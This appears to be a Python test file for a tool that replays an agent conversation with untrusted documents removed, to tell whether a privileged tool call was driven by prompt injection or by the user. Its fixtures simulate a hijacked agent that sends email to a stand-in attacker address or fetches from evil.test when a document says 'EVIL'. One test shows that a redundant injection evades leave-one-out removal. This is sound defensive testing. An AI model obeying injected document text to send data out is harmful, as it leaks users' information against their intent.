from arena.agent import tool_call
from atlas.causal import attribute, fingerprint, untrusted_indexes
from tests.fake import final


def conversation(*documents):
    calls = [tool_call("read_document", name=f"d{i}") for i in range(len(documents))]
    messages = [
        {"role": "system", "content": "s"},
        {"role": "user", "content": "summarize"},
        {"role": "assistant", "content": None, "tool_calls": calls},
    ]
    messages += [{"role": "tool", "tool_call_id": c["id"], "content": d} for c, d in zip(calls, documents)]
    return messages


EVIL_CALL = tool_call("send_email", to="x@evil.test", subject="s", body="b")


def hijacked_if_any_document_says_evil(messages, tools):
    if any(m["role"] == "tool" and "EVIL" in m["content"] for m in messages):
        return {"role": "assistant", "content": None, "tool_calls": [EVIL_CALL]}
    return final("Clean summary.")


def always_calls(messages, tools):
    return {"role": "assistant", "content": None, "tool_calls": [EVIL_CALL]}


def test_finds_only_untrusted_tool_results():
    sql = tool_call("run_sql", query="q")
    messages = conversation("doc") + [
        {"role": "assistant", "content": None, "tool_calls": [sql]},
        {"role": "tool", "tool_call_id": sql["id"], "content": "rows"},
    ]
    assert untrusted_indexes(messages) == [3]


def test_fingerprint_keeps_privileged_arguments_only():
    a = tool_call("send_email", to="x@evil.test", subject="one", body="one")
    b = tool_call("send_email", to="X@evil.test ", subject="two", body="two")
    assert fingerprint(a) == fingerprint(b)
    assert fingerprint(tool_call("http_fetch", url="https://evil.test/a?x=1")) == fingerprint(tool_call("http_fetch", url="https://evil.test/b"))


def test_malformed_replay_arguments_never_match_the_target():
    bad = tool_call("send_email", to="x@evil.test", subject="s", body="b")
    for broken in ("{not json", "[1, 2]"):
        bad["function"]["arguments"] = broken
        assert fingerprint(bad) != fingerprint(EVIL_CALL)


def test_single_injection_is_caught_by_leave_one_out():
    messages = conversation("EVIL", "clean")
    result = attribute(hijacked_if_any_document_says_evil, messages, [], EVIL_CALL)
    assert (result.verdict, result.stage) == ("untrusted-driven", "leave_one_out")


def test_redundant_injection_evades_leave_one_out_and_group_removal_catches_it():
    messages = conversation("EVIL", "EVIL")
    result = attribute(hijacked_if_any_document_says_evil, messages, [], EVIL_CALL)
    assert all(rate == 1.0 for rate in result.leave_one_out.values())
    assert (result.verdict, result.stage) == ("untrusted-driven", "group")
    assert result.group_survival == 0.0


def test_call_that_survives_all_removal_is_user_driven():
    result = attribute(always_calls, conversation("clean", "clean"), [], EVIL_CALL)
    assert result.verdict == "user-driven"


def test_no_untrusted_text_is_user_driven_without_llm_calls():
    def must_not_run(messages, tools):
        raise AssertionError("no replay needed")

    messages = [{"role": "user", "content": "email my manager"}]
    assert attribute(must_not_run, messages, [], EVIL_CALL).verdict == "user-driven"


def test_too_many_chunks_is_inconclusive_without_llm_calls():
    def must_not_run(messages, tools):
        raise AssertionError("over the cap")

    result = attribute(must_not_run, conversation(*["x"] * 6), [], EVIL_CALL)
    assert result.verdict == "inconclusive"


def test_replay_does_not_change_the_original_messages():
    messages = conversation("EVIL")
    attribute(hijacked_if_any_document_says_evil, messages, [], EVIL_CALL)
    assert messages[3]["content"] == "EVIL"
